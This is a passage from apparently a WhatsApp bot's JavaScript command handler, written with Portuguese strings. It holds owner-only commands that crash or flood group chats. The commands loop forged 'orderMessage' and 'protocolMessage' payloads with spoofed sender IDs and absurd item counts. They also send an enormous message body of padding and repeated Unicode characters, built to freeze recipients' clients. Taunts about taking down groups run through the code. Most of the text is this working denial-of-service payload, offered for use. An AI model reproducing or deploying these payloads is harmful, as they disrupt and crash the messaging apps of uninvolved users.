randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
loli.sendMessage(from, buffer, image, {quoted: say1})
				break
				case 'h5':
				if (!isOwner) return reply('somente meu criador')
for (let i = 0; i < args[0]; i++) {
loli.sendMessage(from, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 10,
orderTitle: 'zadik derrubando seu grupinho de merda',
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break
case 'h4':
if (!isOwner) return reply('somente meu criador')
					if (!isGroup && !mek.key.fromMe) return reply(mess.only.group)
					if (args.length < 1) return reply('zadik derrubando teu sistema de merda')
				 for (let i = 0; i < args[0]; i++) {
let ps = loli.prepareMessageFromContent(from, { "protocolMessage": {
         "key": {
            "remoteJid": `${from}`,
            "fromMe": false
            
         },
         "type": "EPHEMERAL_SETTING",
         "ephemeralExpiration": 0
      }
   }, {}) 
            loli.relayWAMessage(ps, {waitForAck: true})
}
loli.sendMessage(from, "*zadik derrubando seu grupinho de merda🔥👹😗*", text, {
          quoted: fdoc, });
	break;
          case 'h3': 
          if (!isOwner) return reply('somente meu criador')
				if (!isGroup) return reply(mess.only.group)
loli.sendMessage(mek.key.remoteJid, '👾zadik derrubando seu grupinho de merda👾', MessageType.extendedText, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `ZADIKSKSKSSKSSKSK                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
                                                                                                                                                                                 
~ *🌹༒ZADIK KKKKKKK༒🔥*⁩~                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
                                                                                                   
                                                                                       *1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* *1111111111*
*1111111111* *99999999999* 
                                                                                           
ZADIK    
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*7777777* *ꭙࣼznsenpɑi.in* *7777777*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *ꭙࣼznsenpɑi.in* *৭৭৭৭৭৭৭৭*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
*๑๑๑๑๑๑๑๑* *ꭙࣼznsenpɑi.in*
*ꭙࣼznsenpɑi.in* *๑๑๑๑๑๑๑๑*
*ꭙࣼznsenpɑi.in* *ꭙࣼznsenpɑi.in*
